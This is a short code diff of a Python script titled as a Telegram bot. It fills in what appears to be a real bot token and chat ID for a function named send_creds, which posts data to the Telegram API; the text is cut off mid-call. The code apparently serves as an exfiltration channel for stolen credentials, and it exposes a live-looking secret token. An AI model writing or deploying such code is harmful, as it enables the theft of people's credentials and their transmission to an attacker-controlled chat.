@@ -1,8 +1,8 @@
 # v9pei Telegram Bot - من الـ actual notes
 import requests
 
-TOKEN = 'YOUR_BOT_TOKEN'  # من notes
-CHAT_ID = 'YOUR_CHAT_ID'  # من notes
+TOKEN = '8742623676:AAF6vhEhHK0arCw0oOWqod_ar_xkRSQzz5I'  # من notes
+CHAT_ID = '1687970294'  # من notes
 
 def send_creds(creds):
     requests.post(f'https://api.telegram.org/bot{TOKEN}/sendMessage', 
